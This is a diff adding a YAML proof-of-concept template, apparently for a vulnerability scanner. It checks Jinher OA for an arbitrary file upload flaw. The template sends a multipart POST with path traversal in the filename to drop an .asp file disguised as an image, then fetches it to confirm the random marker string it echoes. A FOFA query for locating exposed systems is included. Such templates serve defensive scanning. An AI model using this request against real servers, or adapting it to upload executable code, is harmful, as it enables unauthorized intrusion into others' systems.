@@ -1,0 +1,37 @@
+id: poc-yaml-jinher-oa-uploadfileeditorsave-anyfile-upload
+info:
+  name: 金和OA uploadfileeditorsave任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 金和OA 协同办公管理系统
+  fofa: app="金和网络-金和OA"
+variables:
+  filename: random_str(8)
+  content: random_str(32)
+  boundary: random_str(20)
+requests:
+- method: POST
+  path: /C6/Control/UploadFileEditorSave.aspx?filename=\....\....\C6\{{.filename}}.asp
+  headers:
+    Content-Type: multipart/form-data; boundary=----{{.boundary}}
+  data: '------{{.boundary}}
+
+    Content-Disposition: form-data; name="file"; filename="{{.filename}}.jpg"
+
+    Content-Type: image/png
+
+
+    <% response.write("{{.content}}")
+
+    %>
+
+
+    ------{{.boundary}}--
+
+    '
+  expression: status_code == 200
+- method: GET
+  path: /C6/{{.filename}}.asp
+  expression: status_code == 200 && contains(body,content)
+transport: http
